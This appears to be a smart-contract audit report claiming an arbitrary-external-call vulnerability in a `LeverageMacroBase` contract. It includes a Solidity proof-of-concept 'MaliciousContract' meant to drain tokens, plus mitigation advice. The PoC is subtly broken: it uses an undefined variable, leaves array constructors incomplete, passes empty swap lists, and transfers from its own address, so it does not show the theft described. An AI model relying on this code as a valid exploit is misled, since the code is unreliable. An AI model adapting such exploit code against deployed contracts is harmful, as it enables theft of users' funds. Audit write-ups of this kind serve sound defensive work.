# Vulnerability details

## Description
The `LeverageMacroBas`e contract's `_doSwap` function contains a critical vulnerability that allows arbitrary external addresses to be called due to inadequacies in the `_ensureNotSystem` function. This oversight could potentially enable malicious actors to transfer tokens out of the contract.

## Impact
This vulnerability can lead to a loss of funds from the contract as malicious actors can exploit the arbitrary external call to transfer tokens out of the contract.

## Proof of Concept
**Deploy a malicious contract**: A malicious contract is deployed that can exploit the arbitrary external call.

**Invoke the `_doSwap` function**: The malicious contract is set as the `addressForApprove` and `addressForSwap`.

**Exploit the approval**: The malicious contract uses the approval to transfer tokens from the `LeverageMacroBase` contract to the attacker’s address.

```
// Malicious Contract Example
contract MaliciousContract {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function exploit(address leverageMacroBase) external {
        LeverageMacroBase(lmb).doOperation(
            FlashLoanType.noFlashloan,
            0,
            LeverageMacroOperation({
                tokenToTransferIn: address(token),
                amountToTransferIn: 0,
                swapsBefore: new SwapOperation ,
                swapsAfter: new SwapOperation ,
                operationType: OperationType.None,
                OperationData: ""
            }),
            PostOperationCheck.none,
            PostCheckParams({
                expectedDebt: CheckValueAndType({value: 0, operator: Operator.skip}),
                expectedCollateral: CheckValueAndType({value: 0, operator: Operator.skip}),
                cdpId: "",
                expectedStatus: ICdpManagerData.Status(0)
            })
        );
    }

    function swapOperation() external {
        token.transferFrom(address(this), msg.sender, token.balanceOf(address(this)));
    }
}
```

## Tools Used
Manual code review

## Recommended Mitigation Steps

**Restrict external calls**: Strengthen the `_ensureNotSystem` function to comprehensively restrict unauthorized external calls, including adding critical system addresses and contract types not currently covered.

**Restrict approvals**: Ensure that approvals are only given to trusted contracts.

**Implement allowlists**: Maintain an allowlist of approved contracts that can interact with the `LeverageMacroBase` contract.
